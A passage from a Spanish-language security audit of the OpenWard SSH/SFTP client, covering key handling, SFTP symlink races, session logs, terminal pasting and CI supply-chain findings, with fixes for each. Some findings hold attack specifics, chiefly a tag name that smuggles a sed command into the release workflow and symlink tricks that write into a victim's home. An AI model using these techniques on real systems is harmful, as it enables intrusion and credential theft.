-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-import/src/termius/keychain.rs:42,58,85`; `termius/crypto.rs:34-45`; `termius/model.rs:67-72,143-160,256`; `core/crates/openward-ffi/src/api/keychain.rs:113-141`; `core/crates/openward-app/src/keychain.rs:435,455`.
-- **Qué pasa:** la clave maestra de Termius y lo que descifra van en `String` y `Vec` normales; las **contraseñas** de Termius se descifran solo para contarlas; `generate_key` (con la frase de paso) e `import_key` (con la clave privada) no usan `Zeroizing`, aunque `change_key_passphrase` sí.
-- **Recomendación:** contar las contraseñas sin descifrarlas; `Zeroizing` en `decrypt`, en la clave maestra y en la FFI. Es la base de los secretos de D6.
-
-### DA-6 · Exportar una clave: los permisos van después y no se comprueban
-- **Gravedad:** Baja · **Confianza:** Probable (falta ver si `File.copy` conserva el modo del origen)
-- **Ubicación:** `app/lib/keys/key_actions.dart:43-48`.
-- **Qué pasa:** `File(from).copy(to)` y después `Process.run('chmod', ['600', …])`, sin mirar el código de salida. Sobre un archivo que ya existía, la clave se escribe con sus permisos hasta el `chmod`; en FAT, exFAT o SMB el `chmod` falla en silencio y la app dice «exportada»; en Windows no se restringe la ACL.
-- **Recomendación:** exportar desde el núcleo (temporal con `create_new` y 0600, y `rename`), y avisar si el destino no admite permisos.
-
-### DA-7 · Leer un certificado sin comprobar que es un archivo, en el hilo de la interfaz
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/keys.rs:82-91`; `core/crates/openward-ffi/src/api/identities.rs:242-285`; `app/lib/identities/identity_editor.dart:276`.
-- **Qué pasa:** un `certificate_files` que apunta a `/dev/zero` o a una FIFO (desde `~/.ssh/config`) cuelga o agota la memoria al abrir Identidades; al conectar sí se comprueba (`connect.rs:544`).
-- **Recomendación:** `openward_import::files::read` o lo mismo: archivo normal y con tope.
-- **Relación:** DT-14.
-
-### DA-8 · SECURITY.md: cierto para el vault, incompleto para la carpeta de datos
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Qué pasa:** el vault no tiene campo de contraseña y las claves van por su ruta (`openward-proto/src/settings.rs:154`), como dice. Pero la carpeta de datos guarda también el historial de comandos (activado de serie), las recientes y los registros de sesión; las claves traídas de Termius se escriben como estaban, sin frase si no la tenían (`programs.rs:851-855`); y el vault guarda lo que se escriba en snippets, notas, `env` y ProxyCommand.
-- **Recomendación:** decirlo en SECURITY.md, con lo de DA-1.
-
-### DA-9 · Nombres con `%` en `~/.ssh` se expanden como tokens
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/keychain.rs:127-132,230-236`; `core/crates/openward-app/src/local.rs:65-79`.
-- **Qué pasa:** un archivo llamado `%u`, creado fuera de OpenWard, se lista con ese nombre, pero borrarlo, renombrarlo o cambiarle la frase actúa sobre `~/.ssh/<usuario>`. No sale de `~/.ssh`.
-- **Recomendación:** que esas tres acciones reciban el nombre del archivo, no una ruta con tokens.
-
-## SF · SFTP y archivos locales
-
-### SF-1 · La bajada sigue enlaces simbólicos locales que ya estaban (carpetas y `.part`)
-- **Gravedad:** Media · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-sftp/src/local.rs:37-43` (`stat` con `metadata`); `core/crates/openward-sftp/src/transfer.rs:1068-1076,1103-1111,1134-1151,1184-1197`; `transfer.rs:176-177`; `app/lib/sftp/dialogs.dart:40`.
-- **Qué pasa:** el `rename` final sustituye un enlace en lugar de escribir a través de él, pero hay tres casos que sí lo atraviesan:
-  - una carpeta del destino que es un enlace a otra cuenta como «ya existe» y todo se escribe donde apunta; el diálogo de conflicto la enseña como carpeta y propone mezclar;
-  - el `.part` se abre con `create(true).write(true).truncate(false)`, sin `O_NOFOLLOW` ni `O_EXCL`: si es un enlace, se trunca (`set_len`) y se escribe su destino, y luego se le ponen permisos y fecha por ruta;
-  - un `.part` que es un archivo normal de otro usuario, en 0666, se «reanuda»: los primeros bytes del archivo final son suyos y el archivo sigue siendo suyo.
-- **Escenario:** otro usuario escribe en la carpeta a la que se baja (`/tmp` o `/Users/Shared` en macOS, una carpeta de grupo). Para el primer caso le basta saber el nombre de la carpeta; para los otros, la ruta remota, el tamaño y la fecha, porque el nombre del `.part` es un FNV-1a de 32 bits de esos datos, fácil si el archivo es suyo o lo comparte. Así crea o sobrescribe archivos del home de la víctima (en macOS, uno en `~/Library/LaunchAgents` da persistencia). En Linux, `fs.protected_symlinks` y `fs.protected_regular` lo paran en carpetas con sticky como `/tmp`; macOS no tiene nada parecido.
-- **Recomendación:** el `.part` con `O_NOFOLLOW`, y `O_EXCL` si no se reanuda; al reanudar, `fstat` para ver que es un archivo normal y del usuario; permisos y fecha con `fchmod` y `futimens`; las carpetas con `symlink_metadata`, y un enlace rechazado o preguntado; mejor aún, recorrer el destino con descriptores (`openat` con `O_NOFOLLOW`). El diálogo de conflicto dice si algo es un enlace.
-- **Relación:** DT-1 cubre el lado del servidor (`local_join`), no lo que ya hay en el disco; DT-2 identifica un `.part` propio solo por el nombre.
-
-### SF-2 · Lo que se baja por un enlace toma el modo del enlace (DT-16 regresa)
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-sftp/src/remote.rs:181-187`; `core/crates/openward-sftp/src/transfer.rs:841-846,1147,1189-1192`.
-- **Qué pasa:** `follow_links` copia `link_dir` y `size` del destino del enlace, pero no `mode`. El modo de un enlace es 0777, así que el archivo nace 0666 menos la umask y se le añade la ejecución: un `id_ed25519` en 0600 al que se llega por `secrets -> ../keys/id_ed25519` se baja en 0755, legible por los demás.
-- **Recomendación:** `mode` (y la fecha) del `stat` en `follow_links`, o `source.mode` en `download`.
-
-### SF-3 · El modo de las carpetas no se copia en ninguna dirección
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `transfer.rs:949,1073`; `remote.rs:232-233`.
-- **Qué pasa:** una carpeta 0700 queda 0755 al otro lado, y sus archivos 0644, que eran privados por la carpeta, quedan legibles.
-- **Recomendación:** crear las carpetas con el modo del origen, recortado como se hace con los archivos.
-
-### SF-4 · La subida conserva setuid, setgid y sticky
-- **Gravedad:** Baja · **Confianza:** Confirmado en el cliente; el efecto depende del `chmod` del servidor
-- **Ubicación:** `core/crates/openward-sftp/src/transfer.rs:996-1001,1034`; `remote.rs:379,552`; `entry.rs:245`.
-- **Qué pasa:** el modo va con `& 0o7777`: un archivo local con setuid llega así al servidor, y al reemplazar se queda el setuid del archivo de antes con el contenido nuevo. `sftp put` aplica `& 0777`.
-- **Recomendación:** `& 0o777` en los nuevos y sin los bits especiales al reemplazar.
-
-### SF-5 · Al subir una carpeta se sigue cualquier enlace a un archivo, también fuera de ella
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-sftp/src/local.rs:21-29,130-136`; `transfer.rs:953,1014`.
-- **Qué pasa:** `config -> ~/.ssh/id_ed25519` dentro de una carpeta sube la clave; entre el recorrido y el `open` hay además una carrera si otros pueden escribir en la carpeta, y un enlace a una FIFO bloquea el trabajo sin poder cancelarlo.
-- **Escenario:** el usuario descomprime algo que trae enlaces preparados y sube la carpeta a una ruta pública del servidor.
-- **Recomendación:** no seguir los enlaces que salen de la carpeta subida (o preguntar enseñando a dónde llevan); abrir con `O_NOFOLLOW | O_NONBLOCK` y comprobar con `fstat` que es un archivo normal.
-
-### SF-6 · Subir a un servidor Windows con `\` o `:` en los nombres locales
-- **Gravedad:** Baja · **Confianza:** Probable (falta probarlo contra Win32-OpenSSH)
-- **Ubicación:** `transfer.rs:734-735`; `core/crates/openward-sftp/src/lib.rs:96-98`.
-- **Qué pasa:** en Linux y macOS, `..\..\x.bat` es un nombre válido; Win32-OpenSSH trata `\` como separador, y el archivo acabaría fuera del destino. Con `:`, un flujo alternativo (ADS).
-- **Recomendación:** al subir, rechazar `\` y `:` (siempre, o cuando el servidor parezca Windows).
-
-### SF-7 · En Windows, `local_join` acepta nombres reservados y finales en punto o espacio
-- **Gravedad:** Baja · **Confianza:** Probable (falta probarlo en Windows)
-- **Ubicación:** `transfer.rs:827-837`.
-- **Qué pasa:** `CON`, `NUL`, `AUX`, `COM1`, `LPT1` (también con extensión, como `NUL.ow-….part`), `a.`, `a ` y `...` pasan: escribir en un dispositivo, dos nombres que acaban en el mismo archivo, o fallos. No sale de la carpeta.
-- **Recomendación:** rechazarlos o cambiarlos en Windows, como ya se hace con `\` y `:`.
-
-### SF-8 · Lo bajado no lleva marca de origen
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/macos/Runner/Info.plist` (sin `LSFileQuarantineEnabled`); `transfer.rs:1189-1192`.
-- **Qué pasa:** la app nunca abre lo que baja (el doble clic copia), pero un `.command`, una `.app` o un `.exe` abierto luego desde el Finder o el Explorador no pasa por Gatekeeper ni SmartScreen, y conserva el bit de ejecución del servidor. Los nombres con bidi (U+202E) o controles se enseñan tal cual.
-- **Recomendación:** la cuarentena en macOS (la clave del plist o `com.apple.quarantine`) y Mark-of-the-Web en Windows; los bidi y controles de los nombres, a la vista.
-
-### SF-9 · El diálogo de permisos quita los bits especiales y, sobre un enlace, parte de 0777
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/sftp/dialogs.dart:358,368`; `app/lib/sftp/sftp_view.dart:409-415`; `remote.rs:328-334`; `local.rs:85-86`.
-- **Qué pasa:** aplicar permisos a una carpeta 1777 o 2775 quita el sticky o el setgid (también en recursivo): en una carpeta compartida, cualquiera podría borrar archivos ajenos. Sobre un enlace, el diálogo empieza en el modo del enlace y lo aplica al destino: quitar una casilla deja el destino escribible por todos.
-- **Recomendación:** conservar los bits especiales; para un enlace, el modo del destino o el diálogo desactivado.
-
-### SF-10 · Borrar o cambiar permisos en recursivo puede seguir un enlace que aparece a mitad
-- **Gravedad:** Baja · **Confianza:** Probable (carrera no reproducida)
-- **Ubicación:** `core/crates/openward-sftp/src/remote.rs:309-324,341-361`.
-- **Qué pasa:** entre el `lstat` y el `opendir` de una subcarpeta hay una ida y vuelta; otro usuario del servidor que puede escribir en el árbol la cambia por un enlace, y el borrado o el `chmod` siguen en el destino (el home de la víctima). En local, `remove_dir_all` es seguro.
-- **Recomendación:** volver a comprobar con `lstat` lo que da `realpath`; `lsetstat@openssh.com` si el servidor lo ofrece.
-
-### SF-11 · Sin límites ante un servidor hostil: listados, profundidad, tamaño
-- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado en el código; el efecto no se ha medido
-- **Ubicación:** `remote.rs:120-146,314,336,409-467`; `core/crates/openward-sftp/src/pipe.rs:337`.
-- **Qué pasa:** un listado sin fin llena la memoria y no se puede cancelar; un árbol sin fondo, al borrarlo o en un `chmod` recursivo, anida futuros hasta desbordar la pila (aborta el proceso, con todas las sesiones); un archivo listado con 1 KB puede mandar lo que quiera hasta llenar el disco; la suma de tamaños en `u64` da la vuelta.
-- **Recomendación:** topes como los de DT-14 (niveles y entradas); borrado y `chmod` iterativos; la bajada cortada en el tamaño listado, o preguntar; `saturating_add`.
-
-### SF-12 · Informativos del SFTP y el terminal local
-- **Gravedad:** Informativa
-- Subir sobre un enlace del servidor escribe donde apunta sin decirlo (`transfer.rs:968-987`): es lo que decidió DT-8 y lo que hace `sftp`, pero en una carpeta compartida otro usuario puede dejar `informe.pdf -> ~victima/.ssh/authorized_keys`. Conviene enseñar el enlace y a dónde lleva.
-- `install_public_key` sustituye `authorized_keys` aunque sea un enlace (`core/crates/openward-app/src/sftp.rs:161-163`): pasa a ser un archivo normal.
-- `portable-pty` 0.9.0 reserva memoria en `pre_exec` (`close_random_fds` con `read_dir` después del `fork`), que no es seguro en un proceso con hilos; con glibc y macOS suele ir bien. `close_range` o `closefrom` si se hace fork del crate.
-
-## RG · Registros de sesión e historial
-
-### RG-1 · Un espacio delante no evita guardar el comando si la línea se editó
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/history/line_tracker.dart:120,126-128,138-144`; `app/lib/l10n/app_es.arb:440`; `app/test/history_test.dart:98-101`.
-- **Qué pasa:** el espacio inicial solo se mira si la línea no se editó; tras Tab o una flecha, el comando es el texto de la pantalla ya recortado. Va al historial (activado de serie) y como marcador `$ …` al `.cast`. La interfaz promete «Nunca se guarda… lo que empieza por un espacio», y las pruebas solo cubren el caso sin edición.
-- **Escenario:** ` mysql -uroot -pS3cret db<Tab>` queda en `history.json`, que además puede ser legible por otros (DA-1).
-- **Recomendación:** comprobar `_typed.startsWith(' ')` también en la rama editada, y una prueba.
-
-### RG-2 · La pausa no lo cubre todo
-- **Gravedad:** Baja · **Confianza:** Confirmado el marcador; Probable lo demás (comportamiento conocido de tmux, no ejecutado)
-- **Ubicación:** `core/crates/openward-app/src/logs/recorder.rs:119-124,168-176`; `app/lib/terminal/terminal_pane.dart:318-320`; `core/crates/openward-app/src/lib.rs:164-168`.
-- **Qué pasa:** la pausa solo se mira al pulsar Intro, así que un comando empezado en pausa y terminado grabando se guarda entero como marcador; lo que salió en pausa y sigue en pantalla se graba si el programa lo redibuja después (tmux al cambiar de tamaño, less, vim); reconectar a mano empieza un registro sin pausa, y tmux redibuja al engancharse.
-- **Escenario:** en pausa, `cat .env` en una sesión tmux; se sigue grabando y se cambia el tamaño de la ventana: el `.env` queda en el `.cast`, aunque la interfaz dice «Lo que salga mientras, no se guarda».
-- **Recomendación:** descartar el marcador si hubo pausa desde que empezó la línea; decir lo de los redibujados en la ayuda de la pausa; heredar la pausa al reconectar a mano, o avisar.
-
-### RG-3 · Un servidor puede hacer que la retención borre los demás registros
-- **Gravedad:** Baja · **Confianza:** Confirmado en el código; tamaños estimados
-- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:489-526,753-761`; `recorder.rs:32`.
-- **Qué pasa:** el tope por sesión (1 GiB) se mide antes de comprimir y no tiene que ver con el límite de espacio (2 GB de serie). Una sesión de texto al azar deja cerca de 0,8 GiB de `.cast.gz` y otro tanto de `.txt.gz`; al cerrarse, `prune` borra empezando por los más antiguos hasta caber: el historial grabado sin guardar de los demás hosts. Varias pestañas lo multiplican.
-- **Escenario:** un servidor comprometido borra el rastro de las sesiones anteriores en otros hosts, justo lo que el registro debía conservar para el informe de una incidencia.
-- **Recomendación:** un tope en disco por sesión, como fracción del límite; al podar, primero la sesión que lo desbordó.
-
-### RG-4 · Abrir, exportar o copiar un registro lo carga entero en memoria
-- **Gravedad:** Baja (la app se cae) · **Confianza:** Confirmado el camino y la expansión ×6 (prueba ejecutada); Probable el aborto
-- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:595-622,703-738`; `core/crates/openward-app/src/logs/cast.rs:263-286,291-334`.
-- **Qué pasa:** un servidor manda 1 GiB de `\x01`, que no se ve y se comprime muchísimo. Exportar a `.cast` reserva unos 6 GiB (cada byte de control se escribe como `\u00XX`) y, si la reserva falla, Rust aborta el proceso; abrir el visor carga más de 1 GiB, y «Copiar como texto» lo lleva a Dart y al portapapeles.
-- **Recomendación:** exportar línea a línea, sin cargar el archivo; leer la reproducción por tramos o con tope; avisar antes de copiar un texto grande.
-
-### RG-5 · Las entradas de sesión se guardan siempre, también con «Conexiones recientes» apagado
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:352-400`; `logs/sink.rs:61-83`; `core/crates/openward-app/src/lib.rs:387-436,521-536`; `app/lib/home/recent.dart:139-140,191-195`; `app/lib/l10n/app_es.arb:3051`.
-- **Qué pasa:** sin grabar y con las recientes apagadas, cada sesión deja dónde (`usuario@host:puerto`), cuándo, cuánto y cómo acabó, durante 30 días o para siempre, también las de terminales locales (la ayuda de recientes dice «Los terminales locales no»), y «Borrar» en las recientes no las toca. No hay forma de desactivarlas.
-- **Recomendación:** que «Conexiones recientes» apagado, o un interruptor propio, evite las entradas sin grabación; o decirlo junto al interruptor y en «Borrar».
-
-### RG-6 · El texto para buscar y exportar no es fiel ante un servidor hostil
-- **Gravedad:** Baja · **Confianza:** Confirmado el filtro (prueba ejecutada); Probable el efecto visual
-- **Ubicación:** `core/crates/openward-app/src/logs/text.rs:255-259,276`; `app/lib/logs/logs_page.dart:671-675,861-867,906-913`.
-- **Qué pasa:** las secuencias OSC, DCS y APC solo terminan con BEL o ESC; Ghostty las cancela también con CAN y SUB. Tras `ESC ] 0 ; x CAN`, el `.txt.gz`, la búsqueda, «Exportar .txt» y «Copiar» pierden todo hasta el siguiente BEL o ESC, aunque se viera en pantalla. Además U+202E, U+2066–2069 y U+200B pasan tal cual y se pintan con bidi en la vista previa, los resultados y la lista de comandos.
-- **Escenario:** un servidor esconde de la búsqueda lo que enseñó, o hace que un comando se lea al revés en la lista.
-- **Recomendación:** CAN y SUB como fin de secuencia en `TextFilter`; los bidi y de ancho cero a la vista, como en el pegado (TM-14).
-
-### RG-7 · Lo que el historial guarda tras editar lo decide la pantalla, y se reenvía sin mirar
-- **Gravedad:** Baja · **Confianza:** Confirmado el camino; el escenario pide varias acciones del usuario
-- **Ubicación:** `app/lib/history/line_tracker.dart:138-144`; `core/crates/openward-ghostty/src/engine.rs:1059-1088`; `app/lib/palette/command_palette.dart:257-266,918-934`.
-- **Qué pasa:** tras una flecha o Tab, el comando guardado es lo que dibuja la shell, hasta 4000 caracteres y con las celdas invisibles; desde ⌘K se manda con `session.text`, sin la comprobación de invisibles del pegado.
-- **Escenario:** el usuario pulsa ↑ en un host hostil, que dibuja una línea inocente con texto en el color del fondo en las filas siguientes; Intro. Días después la lanza desde ⌘K en otro host, el de la pestaña de delante, y se manda lo escondido.
-- **Recomendación:** al relanzar desde el historial, la misma comprobación que el pegado, y marcar las entradas que vienen de otro host.
-
-### RG-8 · «Borrar todos» y la retención dejan archivos huérfanos
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `core/crates/openward-app/src/logs/mod.rs:249-257,372-388,450-470,770`.
-- **Qué pasa:** solo se borra lo que está en el mapa en memoria. Quedan para siempre, sin contar ni caducar: un `.cast.gz` o `.txt.gz` cuyo `.json` no se lee (por ejemplo tras volver a una versión anterior con un valor nuevo), lo que deja un `begin` fallido y los `.tmp` de un cierre brusco. «Borrar todos… también los guardados» da a entender lo contrario.
-- **Recomendación:** barrer también lo que coincida con `<uuid>.(cast.gz|txt.gz|json.tmp)` sin entrada válida, y admitir valores desconocidos en `Entry`, como el vault con `Unsupported`.
-
-### RG-9 · Informativos de los registros y el historial
-- **Gravedad:** Informativa
-- Un `.cast` manipulado provoca pánicos en el reproductor (`player.rs:98`: `clamp` con un último tiempo negativo; `cast.rs:340-343` acepta 0×0 o 65535×65535). Hace falta escribir en `logs/` (0700, carpeta fija) y flutter_rust_bridge captura el pánico; conviene validar la cabecera y los eventos al leer.
-- «No guardar registros de web-1…» desde el chip no para la grabación en curso (`lib.rs:387-436`, `log_chip.dart:263-295`): ofrecer pausarla o terminarla.
-- Exportar con `mode(0o600)` solo vale al crear: sobre un archivo que ya existía se conservan sus permisos y se sigue el enlace (`mod.rs:205-214`); `export_text` trunca el destino antes de comprobar el id (`mod.rs:609`). El destino lo elige el usuario, así que no hay ataque.
-- El `.cast` exportado lleva las secuencias crudas del servidor, que se interpretan otra vez en el terminal de quien lo reproduzca con `asciinema play` o `cat` (OSC 52, 1337…). «Copiar como texto» deja en el portapapeles todo lo visto, sin avisar.
-- El chip dice «nunca lo que escribes», pero el eco del servidor sí queda; el historial guarda cualquier comando visible, sin un filtro tipo `HISTIGNORE`; y el `.cast` guarda el tiempo de cada evento en microsegundos, así que con `pwfeedback` (asteriscos) queda el ritmo con que se tecleó una contraseña.
-
-## TE · Terminal
-
-### TE-1 · La vista previa del pegado se corta a 400 caracteres sin decir cuánto falta (TM-14 incompleto)
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/terminal/paste.dart:13-14,40,94`.
-- **Qué pasa:** en un pegado de varias líneas (el portapapeles envenenado de una web), lo que pasa de 400 caracteres (600 en varios paneles) no se ve: solo «…», sin contar líneas. El aviso de invisibles mira el texto entero pero no dice dónde están, y `visibleForm` no marca los caracteres de etiqueta (U+E0000–E007F), U+2028/2029, U+00AD ni los selectores de variante.
-- **Recomendación:** el texto entero con desplazamiento, o «y N líneas más», y la lista de invisibles ampliada.
-
-### TE-2 · El aviso de pegado de varias líneas depende del modo 2004
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/terminal/terminal_pane.dart:508`.
-- **Qué pasa:** `\e[?2004h` en cualquier cosa que se muestre (un `cat`) activa el pegado entre corchetes; en una shell que no lo usa (dash, python, bash sin readline), un pegado de varias líneas entra sin preguntar y se ejecuta línea a línea. Ghostty e iTerm2 hacen lo mismo.
-- **Recomendación:** una opción «preguntar siempre con varias líneas».
-
-### TE-3 · Enlaces: `ftp` y `mailto` en la lista, y el destino en crudo
-- **Gravedad:** Informativa · **Confianza:** Confirmado
-- **Ubicación:** `app/lib/terminal/links.dart:16,25-37,66`.
-- **Qué pasa:** la lista es de permitidos, bien, pero `mailto:` con `?attach=` adjunta archivos locales en algunos clientes de Linux, y `ftp:` lo montan el Finder o Nautilus. El destino se enseña tal cual: sin punycode (un homógrafo «аpple.com» parece legítimo) y sin marcar bidi ni invisibles; `linkMisleads` no avisa si el texto lleva espacios («Entra en bank.com»).
-- **Recomendación:** quitar `ftp` y limpiar los parámetros de `mailto`; el host en punycode; `visibleText` sobre el destino; buscar el host en el texto aunque tenga espacios.
-
-### TE-4 · Superficie del motor que no se usa
-- **Gravedad:** Informativa · **Confianza:** Probable (leído en Ghostty, no medido)
-- **Ubicación:** `core/crates/openward-ghostty/src/engine.rs:71-81,255-395`.
-- **Qué pasa:** el protocolo de imágenes de Kitty está activo (10 MB guardados por pantalla, hasta 400 MB transitorios por imagen descomprimida) aunque OpenWard no pinta imágenes; XTVERSION responde a cualquier servidor con la versión exacta («OpenWard 0.3.3-beta.2»).
-- **Recomendación:** `GHOSTTY_TERMINAL_OPT_KITTY_IMAGE_STORAGE_LIMIT = 0`, y valorar si hace falta dar la versión entera.
-
-### TE-5 · Importar un tema de iTerm2 puede congelar la interfaz
-- **Gravedad:** Informativa · **Confianza:** Probable (sin Dart para probarlo)
-- **Ubicación:** `app/lib/terminal/scheme_import.dart:36-40`; `app/lib/settings/appearance_page.dart:591-592`.
-- **Qué pasa:** `<dict>(.*?)</dict>` con `dotAll`, por cada clave y en el hilo de la interfaz: un `.itermcolors` con el prefijo de una clave repetido y sin `</dict>` hace la búsqueda cuadrática.
-- **Recomendación:** un parser de plist, o en un isolate.
-
-## CI · Build, CI y cadena de suministro
-
-### CI-1 · Los paquetes de Linux se construyen con un Zig sin verificar
-- **Gravedad:** Media · **Confianza:** Confirmado (falta la verificación; aprovecharlo pide comprometer el origen o el canal)
-- **Ubicación:** `app/tool/linux/Containerfile:4,15,18-20,22,29`; `app/tool/package-linux.sh:112-113`.
-- **Qué pasa:** los `.tar.gz` de Linux de las releases salen de `make package-linux`, no de la CI. En esa ruta, el Zig que compila `libghostty-vt` se baja con `curl | tar` sin SHA-256 (`install-zig.sh` sí lo comprueba, pero solo lo usa la CI); rustup llega por `curl | sh`, la imagen base por un tag que puede cambiar (`ubuntu:24.04`) y Flutter por `--branch` sin comprobar el commit. La auditoría anterior decía «Zig verificado por SHA-256», que solo es cierto en la CI.
-- **Escenario:** un Zig manipulado (en el origen, en su CDN o en el camino) mete código en `libghostty-vt.a`, que va enlazada en la librería que reciben los usuarios. Nada lo detectaría.
-- **Recomendación:** la tabla de SHA-256 de `install-zig.sh` también aquí, con aarch64-linux; `FROM ubuntu:24.04@sha256:…`; `rustup-init` verificado por hash; el commit de Flutter comprobado tras el clon; la imagen reconstruida con `--pull` en cada release.
-- **Relación:** BR-10.
-
-### CI-2 · La puerta local ejecuta el código de PRs externos en la máquina que publica
-- **Gravedad:** Media · **Confianza:** Probable (depende de cómo se lleven los PRs externos tras publicar)
-- **Ubicación:** `tool/ci.sh:2-4`; `CONTRIBUTING.md:21`; `.github/pull_request_template.md:11`.
-- **Qué pasa:** «Nada llega a `main` sin `make ci` en verde», y `make ci` corre en local. Con el repositorio público, eso es ejecutar el código de un fork (`build.rs`, proc-macros, pruebas, `build-libghostty.sh`, los Containerfiles, el build tool de cargokit) en el Mac del mantenedor, que tiene `~/.ssh`, el llavero, `gh` con permiso de push al tap y las cachés de la build de release (CI-6).
-- **Escenario:** un PR inocente en apariencia cambia un `build.rs`; al lanzar `make ci` para marcar la casilla, roba credenciales o envenena las cachés que luego usa `package-macos.sh`.
-- **Recomendación:** la puerta de los PRs de fuera en GitHub Actions, con «Require approval for all outside collaborators»; nunca código externo sin revisar en la máquina de release (una VM o un usuario aparte si hace falta); CONTRIBUTING y `tool/ci.sh` al día.
-
-### CI-3 · El canal de seguridad no funciona para alguien de fuera (BR-7 sigue abierto)
-- **Gravedad:** Baja · **Confianza:** Confirmado el texto; Probable el ajuste futuro
-- **Ubicación:** `SECURITY.md:7`; `docs/plan/auditoria-0.3.md:108`.
-- **Qué pasa:** el único canal es el reporte privado de vulnerabilidades de este repositorio, que hoy es privado y no lo tiene activado; al hacerlo público no se activa solo. No hay correo de seguridad en ningún sitio, y los binarios ya son públicos en el tap.
-- **Recomendación:** activar el reporte privado el mismo día; un correo alternativo (y si se quiere, PGP); enlazar SECURITY.md desde el README del tap.
-
-### CI-4 · Inyección de órdenes en `release` por el nombre del tag
-- **Gravedad:** Baja (pide permiso de escritura) · **Confianza:** Confirmado (reproducido)
-- **Ubicación:** `.github/workflows/ci.yml:351,355-361`.
-- **Qué pasa:** `TAG` va dentro del programa de `sed` (`s#…/blob/$TAG/docs/#g`). `#` y `;` son válidos en un nombre de ref: `v0.3.0#;eid;#` pasa `git check-ref-format`, cierra la sustitución y añade el comando `e` de GNU sed, que ejecuta `id`; `cut -d. -f1-2` da `0.3` y la comprobación de notas pasa. En ese momento el job tiene `GH_TOKEN` con `contents: write`.
-- **Escenario:** una escalada si algún día se restringe quién toca `.github/workflows` pero no quién crea tags.
-- **Recomendación:** validar `TAG` con la expresión de `tool/bump-version.sh:25` y no meterlo en el programa de `sed` (la expansión de bash o `awk -v`).
-
-### CI-5 · El borrador de release no exige el resto de la CI ni que el tag esté en `main`
-- **Gravedad:** Baja · **Confianza:** Confirmado el workflow; Probable lo de `actions: read`
-- **Ubicación:** `.github/workflows/ci.yml:341-347`.
-- **Qué pasa:** `needs: app` solo: un borrador sale con `deny`, `core` o `ssh` en rojo; no se comprueba que el commit del tag sea de `main`; no hay `environment` con revisores, ni reglas que limiten quién crea tags `v*`. `actions/checkout` deja el token de escritura en `.git/config`. Y con `permissions: contents: write`, el token no tiene `actions: read`, que `gh run download` necesita: el job probablemente falla la primera vez que corra.
-- **Recomendación:** `needs: [core, deny, ssh, app, mobile-check]`; `git merge-base --is-ancestor "$GITHUB_SHA" origin/main`; `environment: release`; un ruleset para los tags `v*` y para `main` al publicar; `actions: read`; `persist-credentials: false`.
-
-### CI-6 · Cachés persistentes compartidas entre builds de confianza y de no confianza
-- **Gravedad:** Baja · **Confianza:** Confirmado el mecanismo; el escenario pide construir un árbol no fiable
-- **Ubicación:** `app/tool/package-linux.sh:128-129`; `core/crates/openward-ghostty/build-libghostty.sh:62,67-73`; `core/crates/openward-ghostty/build.rs:50-56`; `.github/workflows/ci.yml:38,186`.
-- **Qué pasa:** `.build-key` es un SHA-256 de valores públicos (versión de Zig, flags, el script), no un MAC, y la ruta usa los 8 primeros caracteres del commit. Cargo confía en `registry/src` ya extraído y Zig en `~/.cache/zig/p/<hash>` sin recalcular. Los volúmenes de `package-linux.sh` se comparten entre builds. Un árbol no fiable construido con `make package-linux` puede dejar un `libghostty-vt.a` con la `.build-key` correcta, o tocar fuentes de crates, y la build del tag siguiente lo reutiliza. En Actions lo protege el aislamiento por rama.
-- **Recomendación:** volúmenes efímeros o por tag para las builds de release; el commit entero en `.build-key`; esos datos en la clave de `actions/cache`; `save-if` en `Swatinem/rust-cache` solo para `main`.
-- **Relación:** BR-12 cumple su objetivo (no reutilizar una librería vieja), pero no da integridad.
-
-### CI-7 · El build tool de cargokit resuelve sus dependencias sin lockfile
-- **Gravedad:** Baja · **Confianza:** Confirmado el mecanismo
-- **Ubicación:** `app/rust_builder/cargokit/run_build_tool.sh:23-34,73-78`; `app/rust_builder/cargokit/build_tool/pubspec.yaml:14-29`.
-- **Qué pasa:** en cada build limpia se crea un paquete en un temporal, sin `pubspec.lock`, y se lanza `dart pub get`: las directas están fijadas, pero las transitivas flotan en su rango. `build_tool/pubspec.lock` no se usa, y ni dependabot ni `cargo deny` lo cubren.
-- **Escenario:** una versión nueva y maliciosa de una transitiva corre durante `flutter build macos --release`.
-- **Recomendación:** un lock del runner en el repositorio, copiado por `run_build_tool.sh`, y `dart pub get --enforce-lockfile`.
-
-### CI-8 · `build_pod.sh` vuelca todo el entorno en el log
-- **Gravedad:** Baja · **Confianza:** Confirmado
-- **Ubicación:** `app/rust_builder/cargokit/build_pod.sh:14`.
-- **Qué pasa:** un `env` heredado de cargokit. Hoy no hay secretos en la CI, pero con la firma y la notarización las contraseñas del certificado o del Apple ID irían a los logs de Xcode y de Actions (que enmascaran el valor exacto, no lo derivado); en local ya imprime `GH_TOKEN` o `HOMEBREW_GITHUB_API_TOKEN` en DerivedData.
-- **Recomendación:** quitarlo, como los otros parches locales a cargokit.
-
-### CI-9 · `crypto-bigint` 0.7.6 está *yanked* y `cargo deny` falla
-- **Gravedad:** Baja · **Confianza:** Confirmado (`cargo audit` y el índice de crates.io)
-- **Ubicación:** `core/Cargo.lock:569-572`; `core/deny.toml` (`yanked = "deny"`).
